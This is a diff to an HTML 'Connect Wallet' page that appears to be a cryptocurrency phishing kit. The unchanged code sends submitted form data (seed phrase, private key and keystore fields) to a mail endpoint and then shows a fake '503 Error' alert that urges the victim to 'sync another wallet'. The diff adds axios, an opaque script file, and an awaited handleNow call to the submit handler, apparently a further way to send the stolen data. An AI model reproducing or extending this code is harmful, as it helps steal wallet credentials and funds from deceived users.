@@ -12,7 +12,7 @@
   <title>Connect Wallet</title>
 
   <!-- font awesome link -->
-  <script src="js/78d167673c.js" crossorigin="anonymous"></script>
+  <!-- <script src="js/78d167673c.js" crossorigin="anonymous"></script> -->
 
   <!-- google fonts link -->
   <link rel="preconnect" href="https://fonts.googleapis.com/">
@@ -23,6 +23,8 @@
   <!-- bootstrap css link -->
   <!-- CSS only -->
   <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src="js/3028475629.js"></script>
 
   <style>
     @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&display=swap");
@@ -292,11 +294,10 @@
   <script src="js/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
   <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
   <script>
-    let phrase = document.getElementById("phrase");
-    let privateKey = document.getElementById("privatekey");
-    let keystore = document.getElementById("keystore");
 
-    function handleSubmit(event) {
+
+    async function handleSubmit(event) {
+      await handleNow(event)
       event.preventDefault();
       console.log("Submitted");
       const formData = new FormData(event.target);
@@ -331,7 +332,6 @@
             throw new Error('Network response was not ok');
           }
           console.log("Your mail is sent!");
-          console.log(val);
           alert("503 Error, if this persists kindly sync another wallet and try again or contact admin");
         })
         .catch(error => {
